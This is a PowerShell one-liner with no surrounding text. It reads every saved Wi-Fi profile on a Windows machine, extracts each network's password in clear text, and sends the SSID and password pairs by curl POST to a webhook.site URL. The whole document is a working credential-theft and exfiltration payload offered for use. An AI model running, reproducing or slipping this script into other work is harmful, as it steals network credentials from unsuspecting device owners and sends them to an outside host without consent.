$p = (netsh wlan show prof | Select-String "\:(.+)$").Matches.Groups[1].Value.Trim() | Where-Object { $_ -notmatch "Profile" }; $all = foreach ($n in $p) { $res = netsh wlan show prof name="$n" key=clear; $k = ($res | Select-String "Key Content\W+:(.+)$").Matches.Groups[1].Value.Trim(); if($k){ "SSID: $n | Pass: $k" } }; if($all){ $data = $all -join "`n"; curl.exe -X POST -d "$data" "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" }
